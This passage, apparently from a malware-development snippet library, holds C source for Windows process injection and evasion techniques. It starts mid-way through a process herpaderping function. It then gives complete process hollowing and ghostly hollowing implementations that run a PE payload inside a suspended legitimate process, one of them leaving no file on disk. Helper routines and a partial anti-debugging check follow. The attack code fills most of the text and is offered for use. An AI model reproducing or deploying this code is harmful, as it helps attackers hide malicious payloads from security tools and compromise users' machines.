	wsprintfW(szFileNtPath, L"%s %s", szLegitWindowsPe, szPePayloadArgs);

	if (!InitializeProcessParms(lpProcessInformation->hProcess, szFileNtPath, &pImgBaseAddress))
		goto _END_OF_FUNC;

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uPePayloadBuffer + ((PIMAGE_DOS_HEADER)uPePayloadBuffer)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _END_OF_FUNC;

	pEntryPntAddress = (ULONG_PTR)pImgBaseAddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;

	printf("[+] Herpaderping Process Entry Point: 0x%p \n", pEntryPntAddress);

	if (!NT_SUCCESS(g_NtApi.pNtCreateThreadEx(&lpProcessInformation->hThread, THREAD_ALL_ACCESS, NULL, lpProcessInformation->hProcess, pEntryPntAddress, NULL, 0x00, 0x00, 0x00, 0x00, NULL))) {
		printf("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	lpProcessInformation->dwThreadId = GetThreadId(lpProcessInformation->hThread);
	printf("[*] Created Herpaderping Process Thread With ID: %d \n", lpProcessInformation->dwThreadId);

	bResult = TRUE;

_END_OF_FUNC:
	DELETE_HANDLE(hTmpPeFile);
	DELETE_HANDLE(hLegitPeFile);
	DELETE_HANDLE(hSection);
	return bResult;
}
```
### Process Hollowing
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"


#define DELETE_HANDLE(H)						\
	if (H && H != INVALID_HANDLE_VALUE) {		\
		CloseHandle(H);							\
		H = NULL;								\
	}

// =========================================================================================================================================================================================


VOID WriteInput(IN HANDLE StdInWrite) {

	while (1) {

		CHAR	cInputBuffer[1024]		= { 0 };
		DWORD	dwWritten				= 0x00;

		fgets(cInputBuffer, sizeof(cInputBuffer), stdin);

		if (!WriteFile(StdInWrite, cInputBuffer, strlen(cInputBuffer), &dwWritten, NULL) || dwWritten != strlen(cInputBuffer)) {
			printf("[!] WriteFile Failed With Error: %d \n", GetLastError());
			return;
		}
	}
}

// =========================================================================================================================================================================================

VOID PrintOutput(IN HANDLE StdOutRead) {

	DWORD		dwAvailableBytes	= 0x00;
	PBYTE		pAllocatedBuffer	= 0x00;

	while (1) {

		PeekNamedPipe(StdOutRead, NULL, NULL, NULL, &dwAvailableBytes, NULL);

		if (!dwAvailableBytes)
			continue;

		pAllocatedBuffer = (PBYTE)LocalAlloc(LPTR, (SIZE_T)dwAvailableBytes);
		if (!pAllocatedBuffer)
			return;

		if (!ReadFile(StdOutRead, pAllocatedBuffer, dwAvailableBytes, NULL, NULL)) {
			printf("[!] ReadFile Failed With Error: %d \n", GetLastError());
			LocalFree(pAllocatedBuffer);
			break;
		}

		if (pAllocatedBuffer) {
			printf(pAllocatedBuffer);
			LocalFree(pAllocatedBuffer);
		}
	}
}

// =========================================================================================================================================================================================

BOOL CreateHollowedProcessW(IN LPWSTR szLegitWindowsImg, IN OPTIONAL LPWSTR szCommandLineArgs, IN ULONG_PTR uPePayloadBuffer, OUT LPPROCESS_INFORMATION lpProcessInformation) {

	BOOL					bResult					= FALSE;
	CONTEXT					ThreadContext			= { .ContextFlags = CONTEXT_ALL };
	STARTUPINFO				StartupInfo				= { 0 };
	SECURITY_ATTRIBUTES		SecurityAttr			= { 0 };
	PIMAGE_NT_HEADERS		pImgNtHdrs				= NULL;
	PIMAGE_SECTION_HEADER	pImgSecHdr				= NULL;
	SIZE_T					sNumberOfBytesWritten	= NULL;
	ULONG_PTR				uBaseAdddress			= NULL;
	HANDLE					StdInRead				= NULL,
							StdInWrite				= NULL,
							StdOutRead				= NULL,
							StdOutWrite				= NULL;
	LPWSTR					szRemoteProcessCmnd		= NULL;
	HANDLE					hThreadsArray[2]		= { 0 };

	if (!szLegitWindowsImg || !uPePayloadBuffer)
		return FALSE;

	SecurityAttr.nLength				= sizeof(SECURITY_ATTRIBUTES);
	SecurityAttr.bInheritHandle			= TRUE;
	SecurityAttr.lpSecurityDescriptor	= NULL;

	if (!CreatePipe(&StdInRead, &StdInWrite, &SecurityAttr, 0x00)) {
		printf("[!] CreatePipe [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!CreatePipe(&StdOutRead, &StdOutWrite, &SecurityAttr, 0x00)) {
		printf("[!] CreatePipe [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	StartupInfo.cb				= sizeof(STARTUPINFO);
	StartupInfo.dwFlags			|= (STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES);
	StartupInfo.wShowWindow		= SW_HIDE;
	StartupInfo.hStdInput		= StdInRead;
	StartupInfo.hStdOutput		= StartupInfo.hStdError = StdOutWrite;

	if (!(szRemoteProcessCmnd = LocalAlloc(LPTR, (wcslen(szLegitWindowsImg) + (szCommandLineArgs ? (wcslen(szCommandLineArgs) + sizeof(WCHAR)) : 0x00)) * sizeof(WCHAR)))) {
		printf("[!] LocalAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	wsprintfW(szRemoteProcessCmnd, szCommandLineArgs == NULL ? L"%s" : L"%s %s", szLegitWindowsImg, szCommandLineArgs == NULL ? L"" : szCommandLineArgs);

	if (!CreateProcessW(NULL, szRemoteProcessCmnd, &SecurityAttr, NULL, TRUE, (CREATE_SUSPENDED | CREATE_NEW_CONSOLE), NULL, NULL, &StartupInfo, lpProcessInformation)) {
		printf("[!] CreateProcessW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	DELETE_HANDLE(StdInRead);
	DELETE_HANDLE(StdOutWrite);

	printf("[*] Created Remote Process With PID: %d \n", lpProcessInformation->dwProcessId);

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uPePayloadBuffer + ((PIMAGE_DOS_HEADER)uPePayloadBuffer)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _END_OF_FUNC;

	if (!(uBaseAdddress = VirtualAllocEx(lpProcessInformation->hProcess, (LPVOID)pImgNtHdrs->OptionalHeader.ImageBase, (SIZE_T)pImgNtHdrs->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		printf("[!] VirtualAllocEx Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	printf("[+] Allocated Image Base Address: 0x%p\n", (LPVOID)uBaseAdddress);
	printf("[i] Preferable Base Address: 0x%p\n", (LPVOID)pImgNtHdrs->OptionalHeader.ImageBase);

	if (uBaseAdddress != pImgNtHdrs->OptionalHeader.ImageBase)
		goto _END_OF_FUNC;

	if (!WriteProcessMemory(lpProcessInformation->hProcess, uBaseAdddress, uPePayloadBuffer, pImgNtHdrs->OptionalHeader.SizeOfHeaders, &sNumberOfBytesWritten) || pImgNtHdrs->OptionalHeader.SizeOfHeaders != sNumberOfBytesWritten) {
		printf("[!] WriteProcessMemory [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		printf("[i] Wrote %d Bytes Out Of %d \n", sNumberOfBytesWritten, pImgNtHdrs->OptionalHeader.SizeOfHeaders);
		goto _END_OF_FUNC;
	}

	printf("[*] Wrote Headers At %p Of Size %d \n", (LPVOID)uBaseAdddress, (int)pImgNtHdrs->OptionalHeader.SizeOfHeaders);

	pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
	printf("[i] Writing Payload's PE Sections ... \n");
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		printf("\t<i> Writing Section %s At %p Of Size %d \n", pImgSecHdr[i].Name, (void*)(uBaseAdddress + pImgSecHdr[i].VirtualAddress), (int)pImgSecHdr[i].SizeOfRawData);

		if (!WriteProcessMemory(lpProcessInformation->hProcess, (PVOID)(uBaseAdddress + pImgSecHdr[i].VirtualAddress), (PVOID)(uPePayloadBuffer + pImgSecHdr[i].PointerToRawData), pImgSecHdr[i].SizeOfRawData, &sNumberOfBytesWritten) || pImgSecHdr[i].SizeOfRawData != sNumberOfBytesWritten) {
			printf("[!] WriteProcessMemory [%d] Failed With Error: %d \n", __LINE__, GetLastError());
			printf("[i] Wrote %d Bytes Out Of %d \n", sNumberOfBytesWritten, pImgSecHdr[i].SizeOfRawData);
			goto _END_OF_FUNC;
		}
	}

	if (!GetThreadContext(lpProcessInformation->hThread, &ThreadContext)) {
		printf("[!] GetThreadContext Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!WriteProcessMemory(lpProcessInformation->hProcess, (LPVOID)(ThreadContext.Rdx + offsetof(PEB, ImageBase)), &uBaseAdddress, sizeof(ULONGLONG), &sNumberOfBytesWritten) || sizeof(ULONGLONG) != sNumberOfBytesWritten) {
		printf("[!] WriteProcessMemory [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		printf("[i] Wrote %d Bytes Out Of %d \n", sNumberOfBytesWritten, sizeof(ULONGLONG));
		goto _END_OF_FUNC;
	}

	printf("[*] Updated Image Base Address In The Remote Process PEB \n");
	printf("[i] Hijacking Thread Of ID: %d \n", lpProcessInformation->dwThreadId);

	ThreadContext.Rcx = (LPVOID)(uBaseAdddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);

	printf("[+] PE Payload Entry Point: 0x%p \n", ThreadContext.Rcx);

	for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		DWORD		dwProtection		= 0x00,
					dwOldProtection		= 0x00;

		if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress)
			continue;

		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			dwProtection = PAGE_WRITECOPY;

		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
			dwProtection = PAGE_READONLY;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_READWRITE;

		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			dwProtection = PAGE_EXECUTE;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			dwProtection = PAGE_EXECUTE_WRITECOPY;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READ;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READWRITE;

		if (!VirtualProtectEx(lpProcessInformation->hProcess, (PVOID)(uBaseAdddress + pImgSecHdr[i].VirtualAddress), pImgSecHdr[i].SizeOfRawData, dwProtection, &dwOldProtection)) {
			printf("[!] VirtualProtectEx [%s] Failed With Error: %d \n", pImgSecHdr[i].Name, GetLastError());
			goto _END_OF_FUNC;
		}
	}

	if (!SetThreadContext(lpProcessInformation->hThread, &ThreadContext)) {
		printf("[!] SetThreadContext Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (ResumeThread(lpProcessInformation->hThread) == ((DWORD)-1)) {
		printf("[!] ResumeThread Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	printf("[*] Resumed Remote Process \n");
	printf("[*] Reading Output: \n\n");

	if (!(hThreadsArray[0] = CreateThread(NULL, 0x00, PrintOutput, StdOutRead, 0x00, NULL))) {
		printf("[!] CreateThread [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(hThreadsArray[1] = CreateThread(NULL, 0x00, WriteInput, StdInWrite, 0x00, NULL))) {
		printf("[!] CreateThread [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	WaitForMultipleObjects(0x02, hThreadsArray, TRUE, INFINITE);

	bResult = TRUE;

_END_OF_FUNC:
	if (szRemoteProcessCmnd)
		LocalFree(szRemoteProcessCmnd);
	DELETE_HANDLE(StdInRead);
	DELETE_HANDLE(StdOutWrite);
	DELETE_HANDLE(StdInWrite);
	DELETE_HANDLE(StdOutRead);
	DELETE_HANDLE(hThreadsArray[0]);
	DELETE_HANDLE(hThreadsArray[1]);
	return bResult;
}
```
### Ghostly Hollowing
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"

typedef NTSTATUS(NTAPI* fnNtOpenFile)(
	PHANDLE            FileHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK   IoStatusBlock,
	ULONG              ShareAccess,
	ULONG              OpenOptions
	);

typedef NTSTATUS(NTAPI* fnNtWriteFile)(
	HANDLE           FileHandle,
	HANDLE           Event,
	PIO_APC_ROUTINE  ApcRoutine,
	PVOID            ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID            Buffer,
	ULONG            Length,
	PLARGE_INTEGER   ByteOffset,
	PULONG           Key
	);

typedef NTSTATUS(NTAPI* fnNtSetInformationFile)(
	HANDLE                 FileHandle,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass
	);

typedef NTSTATUS(NTAPI* fnNtCreateSection)(
	PHANDLE					SectionHandle,
	ACCESS_MASK				DesiredAccess,
	POBJECT_ATTRIBUTES		ObjectAttributes,
	PLARGE_INTEGER			MaximumSize,
	ULONG					SectionPageProtection,
	ULONG					AllocationAttributes,
	HANDLE					FileHandle
	);

typedef NTSTATUS(NTAPI* fnNtWriteVirtualMemory)(
	HANDLE        ProcessHandle,
	PVOID         BaseAddress,
	PVOID         Buffer,
	SIZE_T        NumberOfBytesToWrite,
	PSIZE_T		  NumberOfBytesWritten
	);

typedef NTSTATUS(NTAPI* fnNtMapViewOfSection)(
	IN		HANDLE				SectionHandle,
	IN		HANDLE				ProcessHandle,
	IN OUT	PVOID*				BaseAddress,
	IN		ULONG_PTR			ZeroBits,
	IN		SIZE_T				CommitSize,
	IN OUT	PLARGE_INTEGER		SectionOffset OPTIONAL,
	IN OUT	PSIZE_T				ViewSize,
	IN		SECTION_INHERIT		InheritDisposition,
	IN		ULONG				AllocationType,
	IN		ULONG				Protect
	);

typedef NTSTATUS(NTAPI* fnNtGetContextThread)(
	IN	HANDLE          ThreadHandle,
	OUT PCONTEXT        pContext
	);

typedef NTSTATUS(NTAPI* fnNtSetThreadContext)(
	IN	HANDLE          ThreadHandle,
	IN  PCONTEXT        pContext
	);

typedef NTSTATUS(NTAPI* fnNtResumeThread)(
	IN	 HANDLE    ThreadHandle,
	OUT  PULONG    SuspendCount OPTIONAL
	);

// ---------------------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------------------

typedef struct _NT_API_FP
{
	fnNtOpenFile					pNtOpenFile;
	fnNtSetInformationFile			pNtSetInformationFile;
	fnNtWriteVirtualMemory			pNtWriteVirtualMemory;
	fnNtWriteFile					pNtWriteFile;
	fnNtCreateSection				pNtCreateSection;
	fnNtMapViewOfSection			pNtMapViewOfSection;
	fnNtGetContextThread			pNtGetContextThread;
	fnNtSetThreadContext			pNtSetContextThread;
	fnNtResumeThread				pNtResumeThread;

} NT_API_FP, * PNT_API_FP;

// ---------------------------------------------------------------------------------------------------------------------------------------------------------

#define DELETE_HANDLE(H)								\
	if (H != NULL && H != INVALID_HANDLE_VALUE){		\
		CloseHandle(H);									\
		H = NULL;										\
	}

// ---------------------------------------------------------------------------------------------------------------------------------------------------------

NT_API_FP	g_NtApi = { 0x00 };

// =========================================================================================================================================================
// =========================================================================================================================================================

BOOL InitializeSyscallsStruct() {

	HMODULE		hNtdll = NULL;

	if (!(hNtdll = GetModuleHandle(TEXT("NTDLL")))) {
		printf("[!] GetModuleHandle Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	g_NtApi.pNtOpenFile					= (fnNtOpenFile)GetProcAddress(hNtdll, "NtOpenFile");
	g_NtApi.pNtSetInformationFile		= (fnNtSetInformationFile)GetProcAddress(hNtdll, "NtSetInformationFile");
	g_NtApi.pNtWriteVirtualMemory		= (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	g_NtApi.pNtWriteFile				= (fnNtWriteFile)GetProcAddress(hNtdll, "NtWriteFile");
	g_NtApi.pNtCreateSection			= (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	g_NtApi.pNtMapViewOfSection			= (fnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	g_NtApi.pNtGetContextThread			= (fnNtGetContextThread)GetProcAddress(hNtdll, "NtGetContextThread");
	g_NtApi.pNtSetContextThread			= (fnNtSetThreadContext)GetProcAddress(hNtdll, "NtSetContextThread");
	g_NtApi.pNtResumeThread				= (fnNtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");


	if(!g_NtApi.pNtOpenFile				||	!g_NtApi.pNtSetInformationFile	||	!g_NtApi.pNtWriteVirtualMemory	||
		!g_NtApi.pNtWriteFile			||	!g_NtApi.pNtCreateSection		||	!g_NtApi.pNtMapViewOfSection	||
		!g_NtApi.pNtGetContextThread	||	!g_NtApi.pNtSetContextThread	||	!g_NtApi.pNtResumeThread)
	{
		return FALSE;
	}

	return TRUE;
}

// =========================================================================================================================================================

VOID RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer) {

	if ((UsStruct->Buffer = (PWSTR)Buffer)) {

		unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
		if (Length > 0xfffc)
			Length = 0xfffc;

		UsStruct->Length = Length;
		UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR);
	}

	else UsStruct->Length = UsStruct->MaximumLength = 0;
}

// =========================================================================================================================================================

BOOL CreateGhostHollowingProcessW(IN LPWSTR szLegitWindowsPeWithArgs, IN ULONG_PTR uPePayloadBuffer, IN SIZE_T sPePayloadSize, OUT LPPROCESS_INFORMATION lpProcessInformation) {

	BOOL							bResult							= FALSE;
	NTSTATUS						STATUS							= STATUS_SUCCESS;
	PVOID							pMappedImgAddress				= NULL;
	PIMAGE_NT_HEADERS				pImgNtHdrs						= NULL;
	SIZE_T							sViewSize						= 0x00;
	CONTEXT							ThreadContext					= { .ContextFlags = CONTEXT_ALL };
	STARTUPINFOW					StartupInfo						= { 0 };
	UNICODE_STRING					usFileName						= { 0 };
	OBJECT_ATTRIBUTES				ObjectAttr						= { 0 };
	IO_STATUS_BLOCK					StatusBlock						= { 0 };
	FILE_DISPOSITION_INFORMATION	FileDispInfo					= { .DeleteFileW = TRUE };
	LARGE_INTEGER					ByteOffset						= { 0 };
	WCHAR							szTmpPath[MAX_PATH]				= { 0 };
	WCHAR							szTmpFilePath[MAX_PATH]			= { 0 };
	WCHAR							szTmpFileNtPath[MAX_PATH * 2]	= { 0 };
	HANDLE							hTmpFileHandle					= NULL,
									hGhostSection					= NULL;
	PWCHAR							pwcDuplicateStr					= NULL,
									pwcLastSlash					= NULL;

	if (!szLegitWindowsPeWithArgs || !uPePayloadBuffer || !sPePayloadSize || !lpProcessInformation)
		return FALSE;

	if (!(pwcDuplicateStr = _wcsdup(szLegitWindowsPeWithArgs)))
		return FALSE;

	if (pwcLastSlash = wcsrchr(pwcDuplicateStr, L'\\'))
		*pwcLastSlash = L'\0';

	if (!InitializeSyscallsStruct())
		return FALSE;

	if (GetTempPathW(MAX_PATH, szTmpPath) == 0x00) {
		printf("[!] GetTempPathW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (GetTempFileNameW(szTmpPath, L"PG", 0x00, szTmpFilePath) == 0x00) {
		printf("[!] GetTempFileNameW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	wsprintfW(szTmpFileNtPath, L"\\??\\%s", szTmpFilePath);

	printf("[i] Created Tmp Path: %ws \n", szTmpFileNtPath);

	RtlInitUnicodeString(&usFileName, szTmpFileNtPath);
	InitializeObjectAttributes(&ObjectAttr, &usFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtOpenFile(&hTmpFileHandle, (DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE), &ObjectAttr, &StatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT)))) {
		printf("[!] NtOpenFile Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	printf("[+] Fetched Tmp File Handle: 0x%0.8X \n", hTmpFileHandle);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtSetInformationFile(hTmpFileHandle, &StatusBlock, &FileDispInfo, sizeof(FILE_DISPOSITION_INFORMATION), FileDispositionInformation)))) {
		printf("[!] NtSetInformationFile Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteFile(hTmpFileHandle, NULL, NULL, NULL, &StatusBlock, uPePayloadBuffer, sPePayloadSize, &ByteOffset, NULL)))) {
		printf("[!] NtWriteFile Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	printf("[i] Wrote Pe Payload To Tmp File \n");

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateSection(&hGhostSection, SECTION_ALL_ACCESS, NULL, 0x00, PAGE_READONLY, SEC_IMAGE, hTmpFileHandle))) || !hGhostSection) {
		printf("[!] NtCreateSection Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	printf("[+] Created Ghost Section: 0x%0.8X \n", hGhostSection);

	DELETE_HANDLE(hTmpFileHandle);

	printf("[i] Deleted Tmp File From The Disk\n");

	if (!CreateProcessW(NULL, szLegitWindowsPeWithArgs, NULL, NULL, TRUE, (CREATE_SUSPENDED | CREATE_NEW_CONSOLE), NULL, pwcDuplicateStr, &StartupInfo, lpProcessInformation)) {
		printf("[!] CreateProcessW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	printf("[*] Created Remote Process With PID: %d \n", lpProcessInformation->dwProcessId);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtMapViewOfSection(hGhostSection, lpProcessInformation->hProcess, &pMappedImgAddress, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_READONLY)))) {
		printf("[!] NtMapViewOfSection Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	printf("[i] Base Address Of The Mapped Ghost Section: 0x%p \n", pMappedImgAddress);

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uPePayloadBuffer + ((PIMAGE_DOS_HEADER)uPePayloadBuffer)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _END_OF_FUNC;

	printf("[i] Hijacking Thread Of ID: %d \n", lpProcessInformation->dwThreadId);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtGetContextThread(lpProcessInformation->hThread, &ThreadContext)))) {
		printf("[!] NtGetContextThread Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	ThreadContext.Rcx = (DWORD64)((ULONG_PTR)pMappedImgAddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtSetContextThread(lpProcessInformation->hThread, &ThreadContext)))) {
		printf("[!] NtSetContextThread Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] PE Payload Entry Point: 0x%p \n", ThreadContext.Rcx);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(lpProcessInformation->hProcess, (LPVOID)(ThreadContext.Rdx + offsetof(PEB, ImageBase)), &pMappedImgAddress, sizeof(ULONGLONG), NULL)))) {
		printf("[!] NtWriteVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	printf("[*] Updated Image Base Address In The Remote Process PEB \n");

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtResumeThread(lpProcessInformation->hThread, NULL)))) {
		printf("[!] NtResumeThread Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	printf("[*] Resumed Remote Process \n");

	bResult = TRUE;

_END_OF_FUNC:
	if (pwcDuplicateStr)
		free(pwcDuplicateStr);
	DELETE_HANDLE(hTmpFileHandle);
	DELETE_HANDLE(hGhostSection);
	return bResult;
}
```
### Get Current Username (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL WhoamiA(OUT LPSTR* lpWhoamiStr) {

    DWORD   dwSize      = 0x00;
    BOOL    bResult     = FALSE;

    if (!GetUserNameA(NULL, &dwSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        printf("[!] GetUserNameA [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(*lpWhoamiStr = (LPSTR)LocalAlloc(LPTR, dwSize + 0x01))){
        printf("[!] LocalAlloc Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!GetUserNameA(*lpWhoamiStr, &dwSize)) {
        printf("[!] GetUserNameA [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (!bResult && *lpWhoamiStr)
        LocalFree(*lpWhoamiStr);
    return bResult;
}
```
### Get Current Username (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL WhoamiW(OUT LPWSTR* szWhoamiStr) {

    DWORD   dwSize      = 0x00;
    BOOL    bResult     = FALSE;

    if (!GetUserNameW(NULL, &dwSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        printf("[!] GetUserNameW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(*szWhoamiStr = (LPSTR)LocalAlloc(LPTR, dwSize * sizeof(WCHAR)))) {
        printf("[!] LocalAlloc Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!GetUserNameW(*szWhoamiStr, &dwSize)) {
        printf("[!] GetUserNameW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (!bResult && *szWhoamiStr)
        LocalFree(*szWhoamiStr);
    return bResult;
}
```
### Get Current Token
```c
#include <windows.h>
#include <stdio.h>
typedef NTSTATUS(NTAPI* fnNtOpenThreadToken)(HANDLE ThreadHandle,ACCESS_MASK DesiredAccess, BOOLEAN OpenAsSelf, PHANDLE TokenHandle);
typedef NTSTATUS(NTAPI* fnNtOpenProcessToken)(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);

HANDLE GetCurrentToken() {

    HANDLE                  hToken                  = NULL;
    NTSTATUS                STATUS                  = 0x00;
    fnNtOpenThreadToken     pNtOpenThreadToken      = NULL;
    fnNtOpenProcessToken    pNtOpenProcessToken     = NULL;

    if (!(pNtOpenThreadToken = (fnNtOpenThreadToken)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtOpenThreadToken"))) {
        printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
        return NULL;
    }

    if (!(pNtOpenProcessToken = (fnNtOpenProcessToken)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtOpenProcessToken"))) {
        printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
        return NULL;
    }

    if ((STATUS = pNtOpenThreadToken((HANDLE)-2, TOKEN_QUERY, FALSE, &hToken)) != 0x00) {
        printf("[-] NtOpenThreadToken Failed With Error: 0x%0.8X \n", STATUS);

        if ((STATUS = pNtOpenProcessToken((HANDLE)-1, TOKEN_QUERY, &hToken)) != 0x00) {
            printf("[!] NtOpenProcessToken Failed With Error: 0x%0.8X \n", STATUS);
            hToken = NULL;
        }
    }

    return hToken;
}
```
### Retrieve Current Process ID
```c
#include <windows.h>
#include <Structs.h>

DWORD _GetCurrentProcessId(){
#ifdef _WIN64
	return HandleToUlong(((PTEB)__readgsqword(0x30))->ClientId.UniqueProcess);
#else
	return HandleToUlong(((PTEB)__readfsdword(0x18))->ClientId.UniqueProcess);
#endif
}
```
### Fetch Current Time
```c
#include <windows.h>
#include <stdio.h>
ULONGLONG SystemTimeAsUnixTime() {

	FILETIME       FileTime     = { 0 };
	ULARGE_INTEGER LargeInteger = { 0 };

	GetSystemTimeAsFileTime(&FileTime);

	LargeInteger.LowPart  = FileTime.dwLowDateTime;
	LargeInteger.HighPart = FileTime.dwHighDateTime;

	return (LargeInteger.QuadPart - 0x019DB1DED53E8000) / 10000000;
}
```
### Anti-Debugging Via NTGlobalFlag
```c
#include <windows.h>
#include <stdio.h>
#define FLG_HEAP_ENABLE_TAIL_CHECK   0x10
#define FLG_HEAP_ENABLE_FREE_CHECK   0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40

BOOL IsDebuggerPresent3() {

  // getting the PEB structure
#ifdef _WIN64
	PPEB					pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
	PPEB					pPeb = (PEB*)(__readfsdword(0x30));
#endif

  // checking the 'NtGlobalFlag' element
